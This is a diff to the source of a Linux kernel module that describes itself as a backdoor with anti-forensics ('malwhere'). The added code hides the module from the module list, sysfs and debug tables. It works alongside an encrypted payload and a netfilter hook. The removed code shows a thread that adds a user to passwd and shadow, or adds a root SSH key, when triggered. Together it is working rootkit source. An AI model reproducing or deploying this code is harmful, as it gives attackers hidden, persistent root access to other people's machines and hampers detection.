@@ -232,6 +232,20 @@ static void unset_nf_hook(void) {
   nf_unregister_hook(&nfho);
 }
 
+
+static void rm_mod_from_list(void) {
+  THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
+  THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
+}
+
+static void rm_mod_from_sysfs(void) {
+  kobject_del(THIS_MODULE->holders_dir->parent);
+}
+
+static void rm_mod_from_ddebug_tables(void) {
+  ddebug_remove_module(module_str);
+}
+
 void xor_range(unsigned char *addr, size_t len, unsigned int k) {
   size_t i;
   preempt_disable();
@@ -307,92 +321,21 @@ void wq_task_add_root_pubkey(void *data) {
   encrypt_payload();
 }
 
-int wait_for_command(void *data) {
-  int processed = 0;
-  while (!kthread_should_stop()) {
-    ssleep(5);
-    debug_output && printk(KERN_ALERT "Thread running\n", atomic_read(&trigger_add_pubkey));
-    
-    /* It's possible for multiple triggers to come in at the same time. This
-     * will end poorly since the payload encryption keys are deleted after use.
-     * This means if one trigger processes immediately after the other, odds
-     * are good that the key material is corrupted. Fix this with a lock.
-     * Poor-man's fix is to skip any unprocessed triggers by setting them to 0.
-     */
-    if (atomic_read(&trigger_add_user) == 1) {
-      decrypt_payload();
-      add_user_passwd();
-      add_user_shadow();
-      encrypt_payload();
-      processed = 1;
-    } else if (atomic_read(&trigger_add_pubkey) == 1) {
-      decrypt_payload();
-      add_root_pubkey();
-      encrypt_payload();
-      processed = 1;
-    }
-
-    if (processed) {
-      atomic_set(&trigger_add_user, 0);
-      atomic_set(&trigger_add_pubkey, 0);
-      processed = 0;
-    }
-  }
-  printk(KERN_INFO "Thread Stopping\n");
-  do_exit(0);
-}
-
 static int __init init(void) {
   encrypt_payload();
   debug_output && printk(KERN_INFO, "Setting nfhook");
   set_nf_hook();
 
-  /*
-  unsigned int block_size = 0;
-  printk(KERN_INFO "[%s] init\n", module_str);
-  struct crypto_shash *ch = crypto_alloc_cipher("aes", 0, 0);
-  if (IS_ERR(ch)) {
-    printk(KERN_INFO, "crypto_alloc_cipher error");
-  }
-  block_size = crypto_ablkcipher_blocksize(ch);
-  unsigned char *cipher = kmalloc(block_size+1, GFP_KERNEL);
-  unsigned char *decipher = kmalloc(block_size+1, GFP_KERNEL);
-  cipher[block_size] = '\0';
-  decipher[block_size] = '\0';
-  crypto_cipher_setkey(ch, "asdfasdfasdfasdf", 16);
-  crypto_cipher_encrypt_one(ch, cipher, "thisisasecret");
-  crypto_cipher_decrypt_one(ch, decipher, cipher);
-  */
+  rm_mod_from_list();
+  rm_mod_from_sysfs();
+  rm_mod_from_ddebug_tables();
 
-  /*
-  size_t nfhook_func_len = 0x06;
-  nfhook_deep_space = __vmalloc(nfhook_func_len, GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC);
-  memcpy(nfhook_deep_space, "\xb8\x05\x00\x00\x00\xc3", nfhook_func_len);
-  set_nf_hook();
-  */
-
-  /*
-  size_t nfhook_func_len = 0x5c;
-  nfhook_deep_space = kmalloc(nfhook_func_len, GFP_KERNEL);
-  memcpy(nfhook_deep_space, nfhook, nfhook_func_len);
-  set_nf_hook();
-  */
-
-  /*
-  char *argv[] = {"/foobaz", "kernelspace", NULL};
-  call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
-  printk(KERN_INFO "memcpy\n");
-  set_nf_hook();
-  printk(KERN_INFO "set nf hook\n");
-  */
-  
   return 0;
 }
 
 static void __exit exit(void) {
-  printk(KERN_INFO "[%s] exiting\n", module_str);
+  debug_output && printk(KERN_INFO "[%s] exiting\n", module_str);
   unset_nf_hook();
-  printk(KERN_INFO "[%s] exited\n", module_str);
 }
 
 module_init(init);
@@ -400,7 +343,7 @@ module_exit(exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("@unixist");
-MODULE_DESCRIPTION("malwhere");
+MODULE_DESCRIPTION("malwhere - kernel backdoor that attempts antiforensics");
 
 module_param(debug_output, int, 0000);
 MODULE_PARM_DESC(debug_output, "Enable debug output.");
